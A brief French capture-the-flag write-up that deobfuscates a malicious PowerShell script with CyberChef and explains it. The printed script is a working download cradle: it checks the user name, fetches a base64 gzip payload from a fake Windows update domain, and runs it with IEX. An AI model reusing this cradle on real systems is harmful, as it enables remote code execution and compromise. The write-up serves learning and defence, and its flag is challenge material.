1. On a un script powershell
2. Mettre le script dans cyberchef, et utiliser l'ingrédient "Generic Code Beautify", on obtient :

```
if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name  - ne 'secret_HQ\Arth')  {
    exit
};
$w = New - Object net.webclient;
$w.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials;
$d = $w.DownloadString('http://windowsliveupdater.com/updates/33'  +  '96f3bf5a605cc4'  +  '1bd0d6e229148'  +  '2a5/2_34122.gzip.b64');
$s = New - Object IO.MemoryStream(, [Convert]::FromBase64String($d));
$f = 'H'  +  'T'  +  'B'  +  '{p0w3rs'  +  'h3ll'  +  '_Cr4d'  +  'l3s_c4n_g3t'  +  '_th'  +  '3_j0b_d'  +  '0n3}';
IEX (New - Object IO.StreamReader(New - Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

3. Premier "if" vérifie le nom de machine, ensuite création d'un client web, une requête effetucée sur windowsliveupdater.com pour télécharger un fichier zip, ensuite le fichier zip est base64 décodé, la variable $f contient notre flag : **HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}**
